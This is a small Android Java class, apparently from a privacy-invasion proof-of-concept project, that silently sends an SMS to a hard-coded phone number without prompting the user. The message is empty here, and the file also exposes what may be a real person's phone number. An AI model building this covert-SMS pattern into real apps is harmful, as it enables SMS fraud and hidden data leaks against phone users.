package com.vergermiya.harevost.fckurprivacy.SilentShooter;

import android.telephony.SmsManager;

import java.util.ArrayList;

/**
 * Created by harevost on 18-7-16.
 */

public class SilentShooter {

    private SmsManager mSmsManger;

    public void sendMessage() {
        String dstNumber = "18801214501";
        String dstMessage = "";

        mSmsManger = SmsManager.getDefault();
        ArrayList<String> smsParts = mSmsManger.divideMessage(dstMessage);
        for (String part : smsParts) {
            mSmsManger.sendTextMessage(dstNumber, null, part, null, null);
        }
    }
}
